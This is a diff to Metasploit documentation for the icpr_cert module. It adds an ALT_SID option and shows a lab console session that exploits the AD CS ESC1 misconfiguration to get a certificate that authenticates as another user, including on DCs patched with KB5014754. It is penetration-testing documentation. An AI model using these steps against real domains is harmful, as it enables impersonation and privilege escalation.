@@ -21,6 +21,15 @@ The certificate template to issue, e.g. "User".
 ### ALT_DNS
 Alternative DNS name to specify in the certificate. Useful in certain attack scenarios.
 
+### ALT_SID
+Alternative object SID to specify in the NTDS_CA_SECURITY_EXT extension. This is useful when exploiting ESC1 on a target
+where the [KB5014754][KB5014754] patch has been applied.
+
+See the following resources for more information.
+
+* https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
+* https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
+
 ### ALT_UPN
 Alternative User Principal Name (UPN) to specify in the certificate. Useful in certain attack scenarios. This is in the
 format `$username@$dnsDomainName`.
@@ -112,11 +121,18 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ### Issue A Certificate With A Specific subjectAltName (AKA ESC1)
 In this scenario, an authenticated user exploits a misconfiguration allowing them to issue a certificate for a different
 User Principal Name (UPN), typically one that is an administrator. Exploiting this misconfiguration to specify a
-different UPN effectively issues a certificate that can be used to authenticate as another user.
+different UPN effectively issues a certificate that can be used to authenticate as another user. If the target server
+has the [KB5014754][KB5014754] patch applied and the REG_DWORD
+`HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` value is set to 2, then the SID for the
+account with the specified UPN should be supplied as well. In November of 2023, Microsoft will change the default value
+of `StrongCertificateBindingEnforcement` to 2. If the server has the patch applied, the SID will be returned in the
+issued certificate which ensures that the required strong mapping is in place. If the strong mapping is required and the
+SID is not specified in the certificate, then Kerberos authentication wil fail with `KDC_ERR_CERTIFICATE_MISMATCH`.
 
 The user must know:
 
 * A vulnerable certificate template, in this case `ESC1-Test`.
+* The SID of a target account, in this case `S-1-5-21-3402587289-1488798532-3618296993-1000`
 * The UPN of a target account, in this case `smcintyre@msflab.local`.
 
 See [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) section on ESC1 for more
@@ -134,20 +150,25 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
 CA => msflab-DC-CA
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Test
 CERT_TEMPLATE => ESC1-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN smcintyre@msflab.local
 ALT_UPN => smcintyre@msflab.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set VERBOSE true
+VERBOSE => true
 msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
 [*] 192.168.159.10:445 - Binding to \cert...
 [+] 192.168.159.10:445 - Bound to \cert
-[*] 192.168.159.10:445 - Requesting a certificate...
+[*] 192.168.159.10:445 - Requesting a certificate for user aliddle - alternate UPN: smcintyre@msflab.local - digest algorithm: SHA256 - template: ESC1-Test
 [+] 192.168.159.10:445 - The requested certificate was issued.
+[*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
 [*] 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
-[*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20220824125859_default_unknown_windows.ad.cs_829589.pfx
+[*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230608111432_default_192.168.159.10_windows.ad.cs_029062.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf6 auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 ### Issue A Certificate With The *Any Purpose* EKU (AKA ESC2)
@@ -287,3 +308,5 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
+
+[KB5014754]: https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
